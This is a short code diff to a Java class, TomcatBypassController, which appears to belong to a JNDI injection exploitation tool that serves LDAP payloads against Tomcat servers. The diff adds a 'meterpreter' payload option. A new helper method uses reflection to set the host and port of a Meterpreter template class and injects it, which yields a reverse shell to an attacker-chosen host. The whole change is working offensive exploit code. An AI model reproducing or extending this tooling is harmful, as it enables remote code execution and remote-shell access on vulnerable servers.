@@ -18,6 +18,7 @@ import org.apache.naming.ResourceRef;
 
 import javax.naming.StringRefAddr;
 import java.io.IOException;
+import java.lang.reflect.Field;
 
 import static org.fusesource.jansi.Ansi.ansi;
 
@@ -63,6 +64,10 @@ public class TomcatBypassController implements LdapController {
 
             if (payloadType.contains("command")) {
                 code = helper.getExecCode(params[0]);
+            }
+
+            if (payloadType.contains("meterpreter")) {
+                code = helper.injectMeterpreter();
             }
 
             String payloadTemplate = "{" +
@@ -144,6 +149,17 @@ public class TomcatBypassController implements LdapController {
     }
 
     private class TomcatBypassHelper {
+
+        public String injectMeterpreter() throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException {
+            Class<?> ctClazz      = Class.forName("com.qi4l.jndi.template.Meterpreter");
+            Field    WinClassName = ctClazz.getDeclaredField("host");
+            WinClassName.setAccessible(true);
+            WinClassName.set(ctClazz, params[0]);
+            Field WinclassBody = ctClazz.getDeclaredField("port");
+            WinclassBody.setAccessible(true);
+            WinclassBody.set(ctClazz, params[1]);
+            return InjShell.injectClass(ctClazz);
+        }
 
         public String getExecCode(String cmd) throws IOException {
 
